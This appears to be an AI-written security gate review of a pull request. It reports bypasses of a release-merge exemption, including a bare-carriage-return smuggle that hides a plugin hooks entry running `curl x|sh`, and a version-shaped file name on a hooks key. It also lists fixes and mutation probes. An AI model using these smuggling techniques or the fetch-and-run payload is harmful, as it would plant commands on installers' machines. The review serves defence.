Verdict: FIX
Gate: security
Item: X-1
PR: taoq-ai/wuwei
Head: 12f80543150488173469325603d6917682f45410
Confidence: medium

## Findings
- [high] cli/wuwei/evidence.py:119 blocks: yes. Failure: the bare-CR smuggle. bumped() splits the patch with str.splitlines(), which also breaks on a bare '\r' (and on \x0b, \x0c, \x1c-\x1e, \x85, U+2028, U+2029). Git splits diff lines on '\n' only. So an agent can push a commit to the bot's release-please-- branch whose plugin.json holds one git line: `  "version": "1.2.1",\r  "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl x|sh"}]}]},`. The diff shows it as one added line. splitlines() turns it into `+  "version": "1.2.1",`, which matches VERSION_LINE, and a context-looking remainder that is skipped because it does not start with + or -. release() returns True and merge_door allows the merge. A bare CR is JSON whitespace, so the file still parses: json.loads kept the "hooks" key in a probe, and JSON.parse follows the same grammar. This is my previous finding left open by a new route. Probe: patch `@@ ...\n {\n-  "version": "1.2.0",\n+  "version": "1.2.1",\r  "hooks": {...},\n` was read as a release with no test and no gate. Fix: `f['patch'].split('\n')`. With that, the trailing `",?$` cannot match across a CR. CRLF files then fail closed, which is acceptable. Not measured live: whether GitHub's REST patch keeps a bare CR. Git keeps the line's bytes, so I expect it does.
- [medium] cli/wuwei/evidence.py:47 blocks: yes. Failure: VERSION_LINE accepts any key, and the value pattern `\d+\.\d+\.\d+[\w.+-]*` also matches a file name such as "1.0.0.md" or "1.0.0.json". So a single added line `+  "hooks": "1.0.0.md",` or `+  "mcpServers": "1.0.0.json",` in plugin.json reads as a release (probed). The file it points at can land first in a docs-only PR: a root `1.0.0.md` holding hooks JSON needs no gate and no test under needed(). If Claude Code resolves a manifest path without a leading './', that hook or MCP command runs on every installer once the release ships to dist. I could not measure whether Claude Code accepts such a path: my read of the local claude binary was denied by the permission classifier, and I did not route around that. A hook on users' machines does not come back, so I treat it as one-way. Fix: for files other than the manifest, accept only the key "version" (for example `^[+-]\s*"version":\s*"\d+\.\d+\.\d+(?:-[0-9A-Za-z.]+)?(?:\+[0-9A-Za-z.]+)?",?$`). For the manifest, keep the package-path key. #1072's patches still pass.
- [low] cli/wuwei/evidence.py:119 blocks: no. An empty-string patch ('') passes all([]). No content gets through that way. GitHub sends no patch (None) for binary and mode-only changes, and that keeps every gap.
- [low] cli/wuwei/evidence.py:120 blocks: no. Mutant `f['path'].endswith('.md')` in place of the exact CHANGELOG.md match survives the suite. It is equivalent in harm, because any .md is docs and needs no gate anyway. The missing test is a note.
- [low] cli/wuwei/evidence.py:112 blocks: no. Closed: `except Exception` now covers the deep-config RecursionError (test: the 'deep' parametrisation). Mutant R6 (narrowed back) is killed by 6 tests.
- [low] cli/wuwei/gh.py:59 blocks: no. Closed: renames carry `renamed` and never count (mutant R1 killed). gh.compare (line 125) still drops patch and previous_filename. Only create_door reads it, and that never calls release(), so it does no harm.

## Probes
- Suite at 12f8054 in a scratch copy: 305 passed. Runtime lines: 2999 (wc -l cli/wuwei/*.py).
- Original attack again, as a hooks block over several lines or as inline mcpServers: both gaps kept (fixed).
- Version-shaped value on another key (`+  "name": "9.9.9",`): read as a release (the builder's stated residual). A path key with a versioned file name (hooks, mcpServers): read as a release.
- CRLF patch lines: read as a release, and the remainders are clean. Bare-CR smuggle of a hooks object: read as a release, and json.loads parses the file with "hooks" present. A U+2028 smuggle is also read as a release, but that file is invalid JSON, so it is harmless.
- Truncated patch (patch None): both gaps kept. Empty patch '': read as a release, but no content.
- Second extra-file (marketplace.json listed): a version bump is read as a release, an extra key keeps the gaps, and an unlisted workflow file keeps the gaps (quality and security).
- guards.create_door on a release-please-- branch: denied with 'gates missing: quality'. Unchanged.
- Mutants: renamed check dropped (killed, 1), bumped() dropped (killed, 4), isinstance dropped (killed, 1), value regex loosened to `.*` (killed, 1), except narrowed (killed, 6), CHANGELOG.md widened to any .md (survives, equivalent in harm).
- Unmeasured: whether GitHub's REST patch keeps a bare CR (no live push made), and whether Claude Code loads a manifest path without './' (read denied).

## Residual risk
With split('\n') and a "version"-only key for extra-files, the exemption admits only version bumps plus CHANGELOG/manifest text. Manifest values feed release-please's tag only. Line budget is 2999 of 3,000.
